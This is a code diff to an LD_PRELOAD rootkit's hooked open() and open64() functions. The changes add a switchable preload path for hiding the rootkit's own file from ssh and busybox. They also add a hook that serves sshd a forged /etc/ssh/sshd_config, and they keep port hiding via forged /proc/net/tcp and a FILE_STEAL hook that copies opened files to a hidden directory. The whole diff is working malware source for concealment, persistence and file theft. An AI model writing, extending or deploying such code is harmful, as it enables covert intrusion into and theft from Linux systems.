@@ -24,7 +24,13 @@ int open(const char *pathname, int flags, mode_t mode){
     }
 
 #ifdef HIDE_SELF
-    if(hidden_path(pathname) && strstr(PRELOAD_FILE, pathname) &&
+    char *preloadpath;
+#ifdef PATCH_DYNAMIC_LINKER
+    preloadpath = PRELOAD_FILE;
+#else
+    preloadpath = OLD_PRELOAD;
+#endif
+    if(hidden_path(pathname) && strstr(preloadpath, pathname) &&
         ((process("ssh") || process("busybox")) &&
         (flags == (64|1|512)))){
         return (long)call(COPEN, "/dev/null", flags, mode);
@@ -36,14 +42,14 @@ int open(const char *pathname, int flags, mode_t mode){
         return -1;
     }
 
-    /*  if a process tries opening certain files, we return back an fd to our own file.
-     *  essentially we mirror the pre-existing file while making sure we omit any
-     *  sensitive information we may not want others seeing.
-     *  we can apply this to any file that a process may need to open. */
-
 #ifdef HIDE_PORTS
     if(!strcmp(pathname, "/proc/net/tcp") || !strcmp(pathname, "/proc/net/tcp6"))
         return fileno(forge_procnet(pathname));
+#endif
+
+#ifdef SOFT_PATCH_SSHD_CONFIG
+    if(!strcmp(pathname, "/etc/ssh/sshd_config\0") && process("/usr/sbin/sshd"))
+        return fileno(sshdforge(pathname));
 #endif
 
 #ifdef FORGE_MAPS
@@ -68,9 +74,6 @@ int open(const char *pathname, int flags, mode_t mode){
 #endif
 
 #ifdef FILE_STEAL
-    /* we want to check if somebody is opening an 'interesting' file,
-     * if they are, we want to essentially copy it to a hidden rootkit directory
-     * for us to see. */
     inspect_file(pathname);
 #endif
     return (long)call(COPEN, pathname, flags, mode);
@@ -100,7 +103,13 @@ int open64(const char *pathname, int flags, mode_t mode){
     }
 
 #ifdef HIDE_SELF
-    if(hidden_path(pathname) && strstr(PRELOAD_FILE, pathname) &&
+    char *preloadpath;
+#ifdef PATCH_DYNAMIC_LINKER
+    preloadpath = PRELOAD_FILE;
+#else
+    preloadpath = OLD_PRELOAD;
+#endif
+    if(hidden_path(pathname) && strstr(preloadpath, pathname) &&
         ((process("ssh") || process("busybox")) &&
         (flags == (64|1|512)))){
         return (long)call(COPEN64, "/dev/null", flags, mode);
@@ -115,6 +124,11 @@ int open64(const char *pathname, int flags, mode_t mode){
 #ifdef HIDE_PORTS
     if(!strcmp(pathname, "/proc/net/tcp") || !strcmp(pathname, "/proc/net/tcp6"))
         return fileno(forge_procnet(pathname));
+#endif
+
+#ifdef SOFT_PATCH_SSHD_CONFIG
+    if(!strcmp(pathname, "/etc/ssh/sshd_config\0") && process("/usr/sbin/sshd"))
+        return fileno(sshdforge(pathname));
 #endif
 
 #ifdef FORGE_MAPS
